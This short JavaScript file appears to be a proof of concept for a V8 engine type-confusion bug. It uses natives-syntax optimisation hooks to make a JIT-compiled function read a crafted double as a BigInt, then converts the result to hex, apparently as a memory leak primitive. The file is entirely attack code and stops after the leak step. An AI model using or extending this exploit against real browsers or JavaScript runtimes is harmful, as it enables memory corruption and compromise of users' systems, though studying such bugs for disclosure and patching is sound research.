function dprint(arg){
	%DebugPrint(arg);
}

var v1 = {};
v1["dd"] = 1n;
v1["dd"] = 1n;
function _f_2(a0) {
    return a0["dd"] + 2n;
};

%PrepareFunctionForOptimization(_f_2);
_f_2(v1);
%OptimizeFunctionOnNextCall(_f_2);

var buffer = new ArrayBuffer(8);
var u32   = new Uint32Array(buffer);
var f64   = new Float64Array(buffer);
u32[0] = 0x100;
u32[1] = 0x0;
v1["dd"] = f64[0];

let temp = [1,2]
temp[0] = 0x112233;
temp[1] = 0x112233;

dprint(temp);
dprint(v1);

let bignum = _f_2(v1) - 2n;


function dec2hex(bignum){ // .toString(16) only works up to 2^53
    var temp = bignum;
    var arr = [];
    while(temp){
        arr.push(   (temp & 0xffffffffffffffffn).toString(16).padStart(16,"0") )
        temp = temp >> 0x40n;
    }
    return arr;
}

bignum = dec2hex(bignum)

